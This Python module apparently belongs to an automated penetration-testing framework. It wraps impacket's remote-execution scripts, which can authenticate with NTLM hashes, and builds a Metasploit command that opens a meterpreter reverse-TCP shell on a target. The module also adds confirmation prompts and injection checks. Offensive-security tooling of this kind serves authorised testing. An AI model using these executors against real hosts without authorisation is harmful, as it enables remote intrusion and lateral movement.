"""
getshell 专项执行器

- ImpacketExecExecutor：调用 impacket 的 psexec/wmiexec/smbexec 脚本远程执行命令
- MSFGetShellExecutor：调用 Metasploit msfconsole 的 exploit 模块建立会话（可选）
"""
import logging
import re
from typing import List, Dict, Optional

from core.executors.base import ToolExecutor

logger = logging.getLogger(__name__)

# msf 模块/payload 名与地址的严格白名单字符集（防 resource 脚本注入）
_MSF_NAME_RE = re.compile(r"^[A-Za-z0-9_./-]+$")
_IP_RE = re.compile(r"^[0-9a-fA-F:.]+$")
_PORT_RE = re.compile(r"^[0-9]{1,5}$")


class ImpacketExecExecutor(ToolExecutor):
    """impacket 远程命令执行（psexec / wmiexec / smbexec / atexec）"""

    METHODS = ("wmiexec.py", "psexec.py", "smbexec.py", "atexec.py")

    def __init__(
        self,
        method: str = "wmiexec.py",
        timeout: int = 300,
        require_confirmation: bool = True,
        whitelist=None,
        allow_all: bool = False,
        confirm_callback=None,
    ):
        if method not in self.METHODS:
            raise ValueError(f"不支持的 impacket 脚本: {method}")
        super().__init__(
            tool_name=method,
            timeout=timeout,
            require_confirmation=require_confirmation,
            whitelist=whitelist,
            allow_all=allow_all,
            confirm_callback=confirm_callback,
        )
        self.method = method

    def build_command(self, step_input, step_config) -> Optional[List[str]]:
        host = self._extract_host(step_input.target)
        if not host or not self._validate_host(host):
            return None

        creds = step_input.credentials or {}
        username = creds.get("username") or step_config.get("username") or "administrator"
        password = creds.get("password") or step_config.get("password") or ""
        hashes = creds.get("hashes") or step_config.get("hashes") or ""
        domain = creds.get("domain") or step_config.get("domain") or ""
        command = step_config.get("command") or "whoami"

        user_at = f"{domain}/{username}" if domain else username
        cmd = [self.method]
        if hashes:
            # 优先用 NTLM 哈希认证，避免明文密码进命令行
            cmd += ["-hashes", hashes]
            target = f"{user_at}@{host}"
        elif password:
            target = f"{user_at}:{password}@{host}"
        else:
            target = f"{user_at}@{host}"
        cmd += [target, command]
        return cmd


class MSFGetShellExecutor(ToolExecutor):
    """Metasploit msfconsole 建立会话（可选，依赖 Metasploit）"""

    def __init__(
        self,
        exploit: str = "exploit/multi/handler",
        payload: str = "windows/meterpreter/reverse_tcp",
        lhost: str = None,
        lport: int = 4444,
        timeout: int = 600,
        require_confirmation: bool = True,
        whitelist=None,
        allow_all: bool = False,
        confirm_callback=None,
    ):
        super().__init__(
            tool_name="msfconsole",
            timeout=timeout,
            require_confirmation=require_confirmation,
            whitelist=whitelist,
            allow_all=allow_all,
            confirm_callback=confirm_callback,
        )
        self.exploit = exploit
        self.payload = payload
        self.lhost = lhost
        self.lport = lport

    def build_command(self, step_input, step_config) -> Optional[List[str]]:
        host = self._extract_host(step_input.target)
        if not host or not self._validate_host(host):
            return None

        exploit = step_config.get("exploit") or self.exploit
        payload = step_config.get("payload") or self.payload
        lhost = step_config.get("lhost") or self.lhost or "127.0.0.1"
        lport = str(step_config.get("lport") or self.lport)

        # 严格校验，防止 msfconsole resource 脚本注入
        if not _MSF_NAME_RE.fullmatch(exploit):
            logger.warning("非法 exploit 模块名: %r", exploit)
            return None
        if not _MSF_NAME_RE.fullmatch(payload):
            logger.warning("非法 payload 名: %r", payload)
            return None
        if not _IP_RE.fullmatch(lhost):
            logger.warning("非法 LHOST: %r", lhost)
            return None
        if not _PORT_RE.fullmatch(lport) or not (1 <= int(lport) <= 65535):
            logger.warning("非法 LPORT: %r", lport)
            return None

        msf_cmds = [
            f"use {exploit}",
            f"set RHOSTS {host}",
            f"set PAYLOAD {payload}",
            f"set LHOST {lhost}",
            f"set LPORT {lport}",
            "exploit -z",
            "exit",
        ]
        return ["msfconsole", "-q", "-x", "; ".join(msf_cmds)]
